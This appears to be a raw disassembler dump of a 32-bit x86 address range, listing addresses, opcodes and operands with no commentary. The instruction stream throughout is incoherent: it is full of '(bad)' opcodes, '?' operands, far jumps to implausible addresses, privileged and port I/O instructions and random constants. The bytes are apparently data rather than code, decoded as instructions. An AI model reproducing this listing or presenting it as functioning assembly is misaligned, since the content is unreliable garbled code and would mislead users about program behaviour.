  4273d4:	lea    edx,[ecx-0x1d]
  4273d7:	mov    edi,0x994040d6
  4273dc:	mov    DWORD PTR [edi+edi*8-0x4],ecx
  4273e0:	cli    
  4273e1:	test   DWORD PTR [ebx],ebp
  4273e3:	loopne 0x427424
  4273e5:	nop
  4273e6:	inc    eax
  4273e7:	and    al,0xc
  4273e9:	adc    eax,0x1b10fe03
  4273ee:	lods   al,BYTE PTR ds:[esi]
  4273ef:	jmp    0xb00:0x129b46e7
  4273f6:	push   edx
  4273f7:	imul   eax,DWORD PTR [edx-0x68],0x88244e42
  4273fe:	fs (bad) 
  427400:	and    eax,DWORD PTR [eax-0x7d182084]
  427406:	sbb    DWORD PTR [ecx],edx
  427408:	xchg   DWORD PTR [eax],eax
  42740a:	add    BYTE PTR [eax],al
  42740c:	add    BYTE PTR [eax],al
  42740e:	fdiv   QWORD PTR [ebp+0x1e1554f6]
  427414:	int    0x1b
  427416:	adc    eax,0xa814ff9d
  42741b:	mov    dl,0xc7
  42741d:	adc    BYTE PTR [eax-0x28007e4e],dl
  427423:	cmp    DWORD PTR [ebx+0xfda77df],esp
  427429:	adc    BYTE PTR [eax-0x83c564e],dl
  42742f:	outs   dx,DWORD PTR ds:[esi]
  427430:	sub    eax,0xf7b27cd4
  427435:	sub    eax,0x9b87b676
  42743a:	fld    DWORD PTR [esi-0x9]
  42743d:	add    edx,DWORD PTR [ebx+esi*8]
  427440:	inc    edx
  427441:	fmul   QWORD PTR [esi]
  427443:	jg     0x427460
  427445:	call   0x101ed88e
  42744a:	lods   al,BYTE PTR ds:[esi]
  42744b:	xchg   edx,eax
  42744c:	or     al,0x9c
  42744e:	aad    0x46
  427450:	test   DWORD PTR [ebx],0xf02af30c
  427456:	fs popa 
  427458:	jo     0x427491
  42745a:	ins    BYTE PTR es:[edi],dx
  42745b:	xchg   esi,eax
  42745c:	add    DWORD PTR [eax],eax
  42745e:	sbb    eax,0x57e7d377
  427463:	fisub  DWORD PTR [ebx+0x71b29012]
  427469:	stos   DWORD PTR es:[edi],eax
  42746a:	paddb  mm7,QWORD PTR [esi-0x6b]
  42746e:	shl    BYTE PTR [edx+0x79f7],1
  427474:	add    BYTE PTR [eax],al
  427476:	add    BYTE PTR [edi+0x6b],al
  427479:	add    ch,BYTE PTR [ebx]
  42747b:	fisubr DWORD PTR [ecx-0x47]
  42747e:	sti    
  42747f:	ja     0x4274e3
  427481:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427482:	xor    al,ch
  427484:	fs pusha 
  427486:	pushf  
  427487:	ret    
  427488:	cmp    eax,0xcbc1dbca
  42748d:	loope  0x427422
  42748f:	xchg   BYTE PTR [edx-0x9],dh
  427492:	jp     0x427470
  427494:	xchg   esi,eax
  427495:	adc    edx,ebx
  427497:	pop    esi
  427498:	aaa    
  427499:	push   cs
  42749a:	test   al,0x3f
  42749c:	test   BYTE PTR [ebx-0x1f],dl
  42749f:	test   DWORD PTR [edi-0x43b0522c],ebp
  4274a5:	movlps xmm4,QWORD PTR [ebx]
  4274a8:	xor    al,0xf
  4274aa:	rcl    al,cl
  4274ac:	stos   BYTE PTR es:[edi],al
  4274ad:	sbb    eax,0xeb23767
  4274b2:	jmp    0xda74eb04
  4274b7:	xchg   ecx,eax
  4274b8:	cmp    eax,0xe3e2ed6b
  4274bd:	xchg   esi,eax
  4274be:	ins    DWORD PTR es:[edi],dx
  4274bf:	xlat   BYTE PTR ds:[ebx]
  4274c0:	sahf   
  4274c1:	daa    
  4274c2:	push   es
  4274c3:	sub    BYTE PTR [eax-0x382a21bf],0x2
  4274ca:	std    
  4274cb:	loopne 0x427457
  4274cd:	push   cs
  4274ce:	or     al,0x92
  4274d0:	mov    cl,0xe
  4274d2:	jmp    0xea2ea39b
  4274d7:	xchg   ebx,eax
  4274d8:	mov    dl,0xed
  4274da:	inc    BYTE PTR [eax]
  4274dc:	add    BYTE PTR [eax],al
  4274de:	add    BYTE PTR [eax],al
  4274e0:	adc    al,0xa5
  4274e2:	outs   dx,BYTE PTR ds:[esi]
  4274e3:	fist   DWORD PTR [ebx-0x4e]
  4274e6:	xchg   edi,eax
  4274e7:	push   es
  4274e8:	mov    edx,?
  4274ea:	or     eax,0xed7b93e9
  4274ef:	fdivr  QWORD PTR [ebx+0xce9524b]
  4274f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4274f6:	data16 fcmovnbe st,st(3)
  4274f9:	mov    dl,0x99
  4274fb:	add    DWORD PTR [edi],0x2c6d1cce
  427501:	mov    bl,0xe
  427503:	jmp    0xde2fffa1
  427508:	dec    edi
  427509:	stos   BYTE PTR es:[edi],al
  42750a:	inc    ebp
  42750b:	pop    esi
  42750c:	ja     0x42757c
  42750e:	add    al,0xa9
  427510:	xchg   ebx,eax
  427511:	xor    BYTE PTR [edx+0x5],dl
  427514:	ins    DWORD PTR es:[edi],dx
  427515:	push   edx
  427516:	mov    es,WORD PTR [eax]
  427518:	cmp    DWORD PTR [esi-0x21177f2],esi
  42751e:	cdq    
  42751f:	inc    edi
  427520:	jmp    0xf6cbb3a7
  427525:	icebp  
  427526:	out    0x15,eax
  427528:	sbb    eax,ebx
  42752a:	sub    al,0x0
  42752c:	mov    ds:0xaa383282,al
  427531:	repnz add eax,0x70a25b85
  427537:	mov    edi,DWORD PTR ds:0xbe0f30ea
  42753d:	xchg   BYTE PTR [esi],dl
  42753f:	data16 ins BYTE PTR es:[edi],dx
  427541:	or     eax,0x5962
  427546:	add    BYTE PTR [eax],al
  427548:	add    dh,dl
  42754a:	ja     0x42759a
  42754c:	or     DWORD PTR [eax],edi
  42754e:	adc    eax,0xf4e26616
  427553:	sbb    BYTE PTR [edi-0x3f60410d],dh
  427559:	jo     0x4274e4
  42755b:	xor    ah,BYTE PTR [ecx+eiz*8]
  42755e:	xchg   esp,eax
  42755f:	jns    0x427561
  427561:	mov    ecx,0x218ad44a
  427566:	imul   ebp,DWORD PTR cs:[edi-0x57],0x24523eb5
  42756e:	xchg   BYTE PTR [esi+0x50],cl
  427571:	push   es
  427572:	(bad)  [eax+0x16]
  427575:	imul   ebp,DWORD PTR [esi+0x32eab619],0x1a4a0cd2
  42757f:	push   esi
  427580:	je     0x4275f3
  427582:	lea    esp,[edx+0x15]
  427585:	xchg   ecx,eax
  427586:	cs push cs
  427588:	add    BYTE PTR [ecx+0x40],ch
  42758b:	push   ecx
  42758c:	inc    eax
  42758d:	sub    al,BYTE PTR [ebp-0x28a6ea17]
  427593:	sub    al,0x0
  427595:	nop
  427596:	pop    esp
  427597:	lods   eax,DWORD PTR ds:[esi]
  427598:	or     al,0x6b
  42759a:	shl    DWORD PTR [ebp+0x44],cl
  42759d:	je     0x427556
  42759f:	or     al,0x89
  4275a1:	iret   
  4275a2:	sbb    eax,0x54904d66
  4275a7:	push   0x10db9194
  4275ac:	call   0x4275b1
  4275b1:	add    BYTE PTR [edi-0x3d],dl
  4275b4:	ltr    WORD PTR [ebx]
  4275b7:	push   cs
  4275b8:	adc    DWORD PTR [edi+0x54fcf7ac],eax
  4275be:	rcl    DWORD PTR [ecx+ebp*2-0x6c],0x91
  4275c3:	fist   DWORD PTR [eax]
  4275c5:	push   ebx
  4275c6:	js     0x42758b
  4275c8:	sub    al,0x3e
  4275ca:	nop
  4275cb:	xor    edx,DWORD PTR [ecx]
  4275cd:	add    BYTE PTR [eax-0x66e27725],cl
  4275d3:	ficom  DWORD PTR [eax]
  4275d5:	test   al,dl
  4275d7:	pop    esi
  4275d8:	pop    ss
  4275d9:	das    
  4275da:	mov    ebx,0xb067d9b
  4275df:	sub    BYTE PTR [edx-0x6f],bh
  4275e2:	(bad)  
  4275e3:	fist   DWORD PTR [eax]
  4275e5:	mov    DWORD PTR [ebp-0x25],esp
  4275e8:	(bad)  
  4275e9:	cli    
  4275ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4275eb:	repz add eax,DWORD PTR [eax-0x70]
  4275ef:	mov    eax,0x1c1a5cf0
  4275f4:	int    0x58
  4275f6:	dec    ecx
  4275f7:	sbb    eax,0x5445fffe
  4275fc:	pop    esi
  4275fd:	push   ecx
  4275fe:	data16 xlat BYTE PTR ds:[ebx]
  427601:	sti    
  427602:	loopne 0x427648
  427604:	arpl   WORD PTR [edx-0x6],dx
  427607:	fist   DWORD PTR [edi+0x45]
  42760a:	jl     0x4275e2
  42760c:	adc    DWORD PTR [eax],eax
  42760e:	nop
  42760f:	pop    eax
  427610:	pop    es
  427611:	in     al,dx
  427612:	xor    DWORD PTR [edx+0x3b7],0x0
  427619:	add    BYTE PTR [eax],al
  42761b:	or     al,0xf3
  42761d:	ret    0x172f
  427620:	outs   dx,BYTE PTR ds:[esi]
  427621:	inc    ebx
  427622:	mov    DWORD PTR [eax+0x3f],edx
  427625:	adc    dh,BYTE PTR [edi]
  427627:	pop    ecx
  427628:	push   ecx
  427629:	pop    esi
  42762a:	adc    dl,dl
  42762c:	fcmovnb st,st(4)
  42762e:	adc    al,BYTE PTR [ebx]
  427630:	mov    cl,0x78
  427632:	jl     0x42769f
  427634:	xacquire xchg BYTE PTR ds:[eax],ch
  427638:	mov    cl,BYTE PTR [bx+di]
  42763b:	scas   al,BYTE PTR es:[edi]
  42763c:	inc    esi
  42763d:	iret   
  42763e:	jmp    0x4abb274b
  427643:	push   ss
  427644:	dec    esi
  427645:	mov    esi,0xffcd8511
  42764a:	(bad)  
  42764b:	psraw  mm1,QWORD PTR [ebp-0x5d]
  42764f:	nop
  427650:	mov    dl,0xf7
  427652:	imul   edx,ebx,0x5c
  427655:	test   DWORD PTR [ebx],0xd8b7f94a
  42765b:	push   cs
  42765c:	xlat   BYTE PTR ds:[ebx]
  42765d:	ja     0x4276c6
  42765f:	fdiv   DWORD PTR [ecx]
  427661:	shl    ebx,cl
  427663:	(bad)  
  427664:	(bad)  
  427665:	not    dh
  427667:	fs pusha 
  427669:	or     al,0xec
  42766b:	jecxz  0x4276a2
  42766d:	aaa    
  42766e:	add    al,0x36
  427670:	mov    dl,0xe9
  427672:	pop    esi
  427673:	mov    ebx,0x50136f9d
  427678:	mov    dl,0x60
  42767a:	jae    0x427689
  42767c:	sar    ebx,0x87
  42767f:	add    BYTE PTR [eax],al
  427681:	add    BYTE PTR [eax],al
  427683:	add    BYTE PTR [edi-0x4f],dl
  427686:	test   DWORD PTR [ebx],0x137b960f
  42768c:	shl    BYTE PTR [edx+0x60e382a8],1
  427692:	ins    BYTE PTR es:[edi],dx
  427693:	pop    eax
  427694:	adc    eax,0xfe60df2
  427699:	(bad)  
  42769a:	psubsw mm2,QWORD PTR [ebx+0x12ae4462]
  4276a1:	fst    QWORD PTR [edx-0x6d3ba7d7]
  4276a7:	push   esi
  4276a8:	sub    BYTE PTR [esi],0x8
  4276ab:	call   0x54642943
  4276b0:	and    BYTE PTR [esi+0x32],bl
  4276b3:	(bad)  
  4276b5:	and    eax,0x3993e90e
  4276ba:	jp     0x4276c1
  4276bc:	mov    WORD PTR [ecx],?
  4276be:	jp     0x42768d
  4276c0:	jg     0x42769c
  4276c2:	dec    ebx
  4276c3:	xchg   ebx,eax
  4276c4:	xchg   ebx,eax
  4276c5:	mov    dl,0x99
  4276c7:	aam    0x3
  4276c9:	mov    ds:0xb2fde94e,al
  4276ce:	inc    ebx
  4276cf:	je     0x4276a0
  4276d1:	xchg   edx,eax
  4276d2:	xor    bl,BYTE PTR [ecx-0x36cd91e0]
  4276d8:	jecxz  0x42773a
  4276da:	in     eax,dx
  4276db:	push   ss
  4276dc:	sbb    dl,dh
  4276de:	sbb    al,0x6d
  4276e0:	je     0x427694
  4276e2:	push   cs
  4276e3:	jmp    0xfd74ecf4
  4276e8:	add    BYTE PTR [eax],al
  4276ea:	add    BYTE PTR [eax],al
  4276ec:	add    BYTE PTR [esi],cl
  4276ee:	stc    
  4276ef:	(bad)  
  4276f0:	in     eax,0x1c
  4276f2:	in     eax,dx
  4276f3:	clc    
  4276f4:	in     al,dx
  4276f5:	cmp    esp,DWORD PTR [edi+0x2c]
  4276f8:	jmp    0xd94b090
  4276fd:	xchg   esp,eax
  4276fe:	sub    eax,0xef17dece
  427703:	or     eax,0x125093e9
  427708:	xor    al,0xf
  42770a:	outs   dx,BYTE PTR ds:[esi]
  42770b:	xor    cl,ch
  42770d:	ret    
  42770e:	xor    eax,0x62b3c552
  427713:	inc    esp
  427714:	add    BYTE PTR [esi],cl
  427716:	ins    BYTE PTR es:[edi],dx
  427717:	xchg   ebx,eax
  427718:	shr    BYTE PTR [esi+0x2e],0xb2
  42771c:	add    BYTE PTR [ecx-0x4e],ch
  42771f:	test   eax,0xeceeccd4
  427724:	imul   ebp,esi,0x2d8dc137
  42772a:	mov    gs,WORD PTR [edx-0x18]
  42772d:	repnz iret 
  42772f:	out    0xff,al
  427731:	in     al,dx
  427732:	cli    
  427733:	xor    BYTE PTR [eax+0x29],bh
  427736:	xor    eax,DWORD PTR [ebx]
  427738:	dec    eax
  427739:	fs repnz in al,dx
  42773c:	mov    ebp,fs
  42773e:	lea    esi,[esi]
  427740:	push   eax
  427741:	jle    0x4276e0
  427743:	(bad)  
  427744:	adc    bh,cl
  427746:	mov    cl,0x9b
  427748:	push   esp
  427749:	push   ebp
  42774a:	mov    ah,BYTE PTR [edi+0xeb2299d]
  427750:	call   0x427755
  427755:	add    ah,al
  427757:	fldlg2 
  427759:	(bad)  
  42775a:	jl     0x42777e
  42775c:	xor    bh,BYTE PTR [eax-0x18]
  42775f:	mov    cl,0xe
  427761:	call   0x2ba7b8
  427766:	into   
  427767:	or     dl,BYTE PTR [edx+0x24]
  42776a:	sbb    esi,0x9ab5b717
  427770:	cmp    BYTE PTR [eax-0x12],dl
  427773:	or     dl,BYTE PTR [edx+0x24]
  427776:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427777:	ficomp WORD PTR [ecx+0xe3a9584]
  42777d:	add    BYTE PTR [ecx-0x7a7b661f],ch
  427783:	ss (bad) 
  427786:	mov    ecx,0xd54499e1
  42778b:	cmc    
  42778c:	pop    esp
  42778d:	lea    esi,ds:0x9000fe8d
  427793:	fist   DWORD PTR [eax]
  427795:	data16 into 
  427797:	mov    edi,DWORD PTR [edx-0x2e]
  42779a:	sti    
  42779b:	sub    eax,0xfb547f8e
  4277a0:	xchg   ebx,eax
  4277a1:	shl    dh,0xf6
  4277a4:	lea    esi,[esp+esi*4-0x21]
  4277a8:	fwait
  4277a9:	test   BYTE PTR [edi+ecx*2+0x64900011],ch
  4277b0:	in     eax,0x23
  4277b2:	je     0x427804
  4277b4:	inc    esi
  4277b5:	push   eax
  4277b6:	mov    edx,0xe7c7d9
  4277bb:	add    BYTE PTR [eax],al
  4277bd:	add    BYTE PTR [eax],al
  4277bf:	sub    eax,0x83001192
  4277c4:	cmp    dh,0xb1
  4277c7:	pop    ebx
  4277c8:	sbb    dl,BYTE PTR [ebp+0x480e9fc0]
  4277ce:	xchg   esp,edx
  4277d0:	test   DWORD PTR [eax],0x10e5dce8
  4277d6:	add    BYTE PTR [ebx],ch
  4277d8:	xlat   BYTE PTR ds:[ebx]
  4277d9:	mov    eax,ds:0xc2c6c301
  4277de:	push   ecx
  4277df:	pop    es
  4277e0:	out    0xb0,al
  4277e2:	adc    BYTE PTR [eax-0x25],dl
  4277e5:	in     eax,dx
  4277e6:	test   ebx,edx
  4277e8:	sbb    al,0xcc
  4277ea:	push   esi
  4277eb:	sbb    ebp,DWORD PTR [esi+0x403dbecc]
  4277f1:	pop    esi
  4277f2:	jg     0x4277e8
  4277f4:	rcl    BYTE PTR [edx+0x10d8dcec],cl
  4277fa:	add    BYTE PTR [ebx+0x7d],ah
  4277fd:	cdq    
  4277fe:	jne    0x427798
  427800:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427801:	ins    DWORD PTR es:[edi],dx
  427802:	jne    0x4277a4
  427804:	inc    eax
  427805:	(bad)  
  427807:	pop    edi
  427808:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427809:	ins    DWORD PTR es:[edi],dx
  42780a:	adc    eax,0xffd0eaf4
  42780f:	sbb    dh,BYTE PTR [edx-0x4b387631]
  427815:	jae    0x427838
  427817:	xchg   ecx,eax
  427818:	mov    dl,0xf7
  42781a:	jbe    0x4277f1
  42781c:	mov    ds:0xa29003f7,al
  427821:	in     al,0x88
  427823:	add    BYTE PTR [eax],al
  427825:	add    BYTE PTR [eax],al
  427827:	add    BYTE PTR [eax+0xd03f7b1],ah
  42782d:	mov    ebp,0xb19887f3
  427832:	test   DWORD PTR [ebx],0x62df2b7
  427838:	mov    ebp,DWORD PTR [ecx*2-0x14d6ffc]
  42783f:	lds    edx,FWORD PTR [ebx-0x6f868c4d]
  427845:	mov    dl,0xf7
  427847:	imul   edx,ebx,0x29
  42784a:	test   DWORD PTR [ebx],0x87f3f30c
  427850:	cmp    BYTE PTR [ebx+0x6f1503f7],dh
  427856:	fistp  DWORD PTR [ebx]
  427858:	rol    bl,0xe1
  42785b:	adc    eax,DWORD PTR [edi+0x2490f772]
  427861:	(bad)  
  427862:	aas    
  427863:	add    al,0x90
  427865:	mov    dl,0x4e
  427867:	mov    eax,ds:0x6bf7b290
  42786c:	iret   
  42786d:	pop    edx
  42786e:	test   DWORD PTR [ebx],0x2bd35f1d
  427874:	sub    DWORD PTR ds:0xda9003f7,esp
  42787a:	mov    ebx,ebp
  42787c:	xlat   BYTE PTR ds:[ebx]
  42787d:	ret    
  42787e:	jno    0x42780f
  427880:	je     0x42784c
  427882:	test   BYTE PTR [ebx],0x90
  427885:	fiadd  DWORD PTR [edi-0x80]
  427888:	mov    ebx,0xb6fbc3
  42788d:	add    BYTE PTR [eax],al
  42788f:	add    BYTE PTR [eax],al
  427891:	dec    esp
  427892:	mov    cs,WORD PTR [esi]
  427894:	rol    ebx,1
  427896:	mov    eax,0xa87825a5
  42789b:	ds mul dh
  42789e:	outs   dx,BYTE PTR ds:[esi]
  42789f:	xor    al,bh
  4278a1:	ret    
  4278a2:	ss push edx
  4278a4:	int    0xc7
  4278a6:	bound  ebx,QWORD PTR [ebx+0xfbaaf65]
  4278ac:	jmp    0x65dddb44
  4278b1:	scas   eax,DWORD PTR es:[edi]
  4278b2:	test   BYTE PTR ds:0x9b6293e9,0x25
  4278b9:	mov    eax,0x44277862
  4278be:	retf   
  4278bf:	into   
  4278c0:	rcl    ebp,cl
  4278c2:	(bad)  
  4278c3:	nop
  4278c4:	sub    eax,0xcfce2d73
  4278c9:	dec    ebx
  4278ca:	enter  0x7423,0x57
  4278ce:	(bad)
  4278d2:	scas   eax,DWORD PTR es:[edi]
  4278d3:	and    DWORD PTR [ebx],ebx
  4278d5:	inc    ebx
  4278d6:	dec    ebp
  4278d7:	adc    BYTE PTR [eax-0x163a1f45],dl
  4278dd:	xchg   ebx,eax
  4278de:	cs into 
  4278e0:	xchg   ebp,eax
  4278e1:	xor    ebp,DWORD PTR [esi]
  4278e3:	in     eax,dx
  4278e4:	popf   
  4278e5:	out    dx,eax
  4278e6:	xchg   ebx,eax
  4278e7:	into   
  4278e8:	xchg   esp,eax
  4278ea:	scas   eax,DWORD PTR es:[edi]
  4278eb:	bound  ebx,QWORD PTR [eax+eiz*1-0x1c3ecd92]
  4278f2:	mov    DWORD PTR [edx],0x79
  4278f8:	add    BYTE PTR [eax],al
  4278fa:	xor    DWORD PTR [edx+0xe],0xca5a9b83
  427901:	je     0x4278d7
  427903:	ret    0x2599
  427906:	enter  0x3e82,0xc1
  42790a:	arpl   WORD PTR [esi-0x67f16f2],ax
  427910:	jae    0x427912
  427912:	inc    eax
  427913:	not    BYTE PTR [ecx*4+0x501a9a6d]
  42791a:	cmp    bh,BYTE PTR [eax-0x17]
  42791d:	mov    eax,DWORD PTR [esi]
  42791f:	push   esi
  427920:	enter  0xf76b,0x44
  427924:	xchg   edx,eax
  427925:	sar    BYTE PTR [ebp-0x72],0xe9
  427929:	je     0x427988
  42792b:	stos   BYTE PTR es:[edi],al
  42792c:	fwait
  42792d:	inc    esp
  42792e:	dec    ebp
  42792f:	sub    cl,0x74
  427932:	dec    ebp
  427933:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427934:	cmp    eax,0xeacc99d2
  427939:	pop    eax
  42793a:	adc    DWORD PTR [esp+eax*8+0x5a317900],edi
  427941:	and    al,0x65
  427943:	dec    esi
  427944:	scas   al,BYTE PTR es:[edi]
  427945:	imul   esi,DWORD PTR [edi-0x4da1b6c1],0x73
  42794c:	inc    ebp
  42794d:	mov    ecx,esp
  42794f:	loope  0x4278fb
  427951:	or     al,0x29
  427953:	sbb    esp,0xffffff89
  427956:	and    al,0xfe
  427958:	gs inc esp
  42795a:	cmp    esp,esi
  42795c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42795d:	mov    eax,0x0
  427962:	add    cl,ah
  427964:	stc    
  427965:	in     al,dx
  427966:	mov    ch,BYTE PTR [eax]
  427968:	jne    0x427960
  42796a:	push   ds
  42796b:	cmp    dh,BYTE PTR [ebp-0x33023e93]
  427971:	lods   al,BYTE PTR ds:[esi]
  427972:	gs jo  0x42792c
  427975:	jp     0x42797a
  427977:	stos   DWORD PTR es:[edi],eax
  427978:	sub    eax,0x3d68420f
  42797d:	bound  eax,QWORD PTR [edx-0x1c9549c3]
  427983:	jo     0x42792e
  427985:	mov    dh,BYTE PTR [ebp+ebp*4-0x4a]
  427989:	lods   eax,DWORD PTR ds:[esi]
  42798a:	push   esi
  42798b:	bound  ecx,QWORD PTR [eax-0x706f8b76]
  427991:	adc    al,BYTE PTR [ecx+0x105bc6]
  427997:	nop
  427998:	enter  0xae9c,0x90
  42799c:	retf   
  42799d:	adc    BYTE PTR [edi],ch
  42799f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4279a0:	pushf  
  4279a1:	xchg   edi,eax
  4279a2:	shr    bl,cl
  4279a4:	adc    BYTE PTR [edx-0x5],ch
  4279a7:	pop    ds
  4279a8:	inc    esp
  4279a9:	sbb    eax,0xd693d495
  4279ae:	inc    edx
  4279b0:	xlat   BYTE PTR ds:[ebx]
  4279b1:	cmp    DWORD PTR [eax+0x1f129808],0x4b
  4279b8:	cld    
  4279b9:	sbb    al,0x95
  4279bb:	cmp    BYTE PTR [ebx+0xa1affd6],dh
  4279c1:	mov    fs,eax
  4279c3:	xchg   ecx,eax
  4279c4:	sbb    bh,BYTE PTR [eax+0x2f]
  4279c7:	add    BYTE PTR [eax],al
  4279c9:	add    BYTE PTR [eax],al
  4279cb:	add    BYTE PTR [esi+ecx*2-0x34339dff],cl
  4279d2:	sbb    eax,0xeb77250c
  4279d7:	inc    ebx
  4279d8:	nop
  4279d9:	or     eax,0x3f250c98
  4279de:	jmp    0x678d0a26
  4279e3:	fist   WORD PTR [eax+0x4c7c10cb]
  4279e9:	dec    edx
  4279ea:	imul   edx,DWORD PTR [bp+si+0x10cb],0x7d
  4279f0:	pop    ebp
  4279f1:	or     BYTE PTR [esp+edi*1+0x43e96325],bl
  4279f8:	nop
  4279f9:	push   esp
  4279fa:	sbb    ch,BYTE PTR [edi]
  4279fc:	dec    edi
  4279fd:	iret   
  4279fe:	sub    eax,0x95d0c3c7
  427a03:	rcl    DWORD PTR [ebx],0xab
  427a06:	adc    cl,dl
  427a08:	stc    
  427a09:	push   ebx
  427a0a:	adc    eax,0x5db28085
  427a0f:	rcl    bh,0x83
  427a12:	je     0x427a04
  427a14:	retf   
  427a15:	rol    bl,0x37
  427a18:	shr    DWORD PTR [edx],1
  427a1a:	hlt    
  427a1b:	xchg   bl,dl
  427a1d:	mov    ch,0x76
  427a1f:	jnp    0x427a5d
  427a21:	xor    al,0x33
  427a23:	add    al,0x2c
  427a25:	out    0x3,al
  427a27:	(bad)  
  427a28:	xchg   ebp,eax
  427a29:	cli    
  427a2a:	push   ds
  427a2b:	rcr    BYTE PTR [edi+0xefe283],0x0
  427a32:	add    BYTE PTR [eax],al
  427a34:	add    BYTE PTR ds:0x5726f776,dl
  427a3a:	test   dl,dh
  427a3c:	out    dx,eax
  427a3d:	add    eax,0x16def777
  427a42:	bnd ja 0x427aa9
  427a45:	xchg   ecx,eax
  427a46:	loope  0x427ac5
  427a48:	aaa    
  427a49:	pushf  
  427a4a:	xor    eax,0xb2d3e1c7
  427a4f:	test   al,0x8
  427a51:	push   0x903bb41
  427a56:	scas   al,BYTE PTR es:[edi]
  427a57:	ret    
  427a58:	test   esp,edx
  427a5a:	mov    dl,0x70
  427a5c:	or     ch,bh
  427a5e:	cli    
  427a5f:	mov    esi,0x362d3fbf
  427a64:	inc    ebp
  427a65:	sub    BYTE PTR [eax+ebp*8+0x19f2174b],ch
  427a6c:	test   eax,0x453c7cc8
  427a71:	xor    BYTE PTR [eax-0xdf0b438],bh
  427a77:	rol    DWORD PTR [edi+0x4503bfeb],1
  427a7d:	lock scas eax,DWORD PTR es:[edi]
  427a7f:	enter  0x524b,0x2b
  427a83:	ss inc ebp
  427a85:	call   0xc73d92e
  427a8a:	inc    edi
  427a8b:	push   cs
  427a8c:	lods   eax,DWORD PTR ds:[esi]
  427a8d:	xchg   ebx,eax
  427a8e:	(bad)  
  427a8f:	iret   
  427a90:	(bad)  
  427a91:	push   esi
  427a92:	gs cdq 
  427a94:	aad    0xbc
  427a96:	bound  esi,QWORD PTR [esi-0x77]
  427a99:	add    BYTE PTR [eax],al
  427a9b:	add    BYTE PTR [eax],al
  427a9d:	add    bl,cl
  427a9f:	jae    0x427aaf
  427aa1:	(bad)  
  427aa2:	mov    al,ds:0x94290036
  427aa7:	sub    eax,0xbce3c153
  427aac:	add    dh,BYTE PTR ds:0x6c0e7285
  427ab2:	push   ebx
  427ab3:	inc    ebp
  427ab4:	sbb    BYTE PTR [esi+0x28ffd680],ch
  427aba:	mov    WORD PTR [edi],?
  427abc:	(bad)  
  427abd:	xchg   edx,eax
  427abe:	xchg   esi,eax
  427abf:	aaa    
  427ac0:	pop    ebx
  427ac1:	xchg   ecx,eax
  427ac2:	sti    
  427ac3:	pop    ds
  427ac4:	in     al,dx
  427ac5:	mov    ?,edx
  427ac7:	add    cl,BYTE PTR [edi]
  427ac9:	mov    al,0xce
  427acb:	dec    edx
  427acc:	scas   al,BYTE PTR es:[edi]
  427acd:	add    DWORD PTR [eax-0x41],edx
  427ad0:	jmp    0x427aae
  427ad2:	pop    es
  427ad3:	mov    al,0x4e
  427ad5:	jmp    0x89553fb0
  427ada:	or     eax,0x66e80e76
  427adf:	popa   
  427ae0:	cdq    
  427ae1:	sbb    al,0xbc
  427ae3:	mov    al,0x4e
  427ae5:	jmp    0xc1ec082a
  427aea:	or     eax,0xaa9a0e76
  427aef:	in     al,0xe3
  427af1:	in     al,dx
  427af2:	repz aas 
  427af4:	push   edx
  427af5:	jmp    0x114ac08e
  427afa:	hlt    
  427afb:	mov    edx,0xf28f1eec
  427b00:	popa   
  427b01:	clc    
  427b02:	add    BYTE PTR [eax],al
  427b04:	add    BYTE PTR [eax],al
  427b06:	add    BYTE PTR [ebx],dl
  427b08:	lods   eax,DWORD PTR ds:[esi]
  427b09:	scas   al,BYTE PTR es:[edi]
  427b0a:	imul   edi,DWORD PTR [edi],0xffffffbf
  427b0d:	or     eax,0xb2b2a600
  427b12:	xor    BYTE PTR ds:0x3b4cd4b3,0xb3
  427b19:	pop    ebp
  427b1a:	inc    esp
  427b1c:	dec    edx
  427b1d:	sbb    al,0x40
  427b1f:	jmp    0x75bb2921
  427b24:	mov    dh,0x5d
  427b26:	inc    DWORD PTR [edi]
  427b28:	dec    esi
  427b29:	arpl   si,di
  427b2b:	into   
  427b2c:	cmp    BYTE PTR [ebp+0x3399af0],dl
  427b32:	call   0x8b2f6e02
  427b37:	neg    ebx
  427b39:	inc    ebx
  427b3a:	ret    
  427b3b:	xchg   ecx,esp
  427b3d:	xchg   ebx,eax
  427b3e:	repnz and bh,BYTE PTR [ebx]
  427b41:	and    eax,0x95b2a6f7
  427b46:	(bad)  
  427b47:	adc    ch,BYTE PTR [esi-0x324808cb]
  427b4d:	adc    BYTE PTR [ebx],dh
  427b4f:	sub    DWORD PTR [eax+0x1a],edx
  427b52:	call   0x2bb74e
  427b57:	sub    ch,BYTE PTR [eax-0x1f]
  427b5a:	idiv   BYTE PTR [edx+esi*4+0x774f5f01]
  427b61:	inc    ebx
  427b62:	push   esi
  427b63:	push   es
  427b64:	das    
  427b65:	in     al,0x33
  427b67:	out    0x2f,eax
  427b69:	test   DWORD PTR [ebp+0x0],0x3c2ce00
  427b73:	push   ebx
  427b74:	ds add al,0x4a
  427b77:	and    al,0x45
  427b79:	add    cl,ch
  427b7b:	add    BYTE PTR [ecx],bh
  427b7d:	mov    dl,0x95
  427b7f:	retf   
  427b80:	sar    edi,1
  427b82:	call   0x1270ea86
  427b87:	cs aaa 
  427b89:	jg     0x427b6c
  427b8b:	jb     0x427b1d
  427b8d:	mov    bh,0xcb
  427b8f:	pop    edx
  427b90:	pop    esi
  427b91:	push   cs
  427b92:	push   ebx
  427b93:	or     BYTE PTR [eax+0x45107648],dl
  427b99:	and    eax,0x181bf19a
  427b9e:	or     eax,0x9bb20b1c
  427ba3:	push   esp
  427ba4:	lods   al,BYTE PTR ds:[esi]
  427ba5:	stos   DWORD PTR es:[edi],eax
  427ba6:	mov    edi,0x16b74488
  427bab:	call   0xfba860d1
  427bb0:	or     esp,esp
  427bb2:	js     0x427be0
  427bb4:	mov    bh,0xf4
  427bb6:	gs test eax,0x10ca90
  427bbc:	sbb    al,0xd9
  427bbe:	dec    ebp
  427bbf:	inc    esp
  427bc0:	je     0x427ba9
  427bc2:	pusha  
  427bc3:	lea    edx,[eax-0x35]
  427bc6:	dec    ebp
  427bc7:	inc    esp
